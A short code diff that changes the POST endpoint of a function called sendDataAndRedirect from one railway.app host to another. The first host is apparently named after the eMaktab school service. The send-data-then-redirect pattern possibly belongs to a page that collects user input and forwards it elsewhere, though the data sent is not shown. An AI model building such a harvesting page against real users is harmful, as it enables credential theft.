@@ -46,7 +46,7 @@ async function sendDataAndRedirect() {
     }
 
     try {
-        const response = await fetch('https://emaktab-production.up.railway.app/requests', {
+        const response = await fetch('https://airy-enjoyment-production-16a0.up.railway.app/requests', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
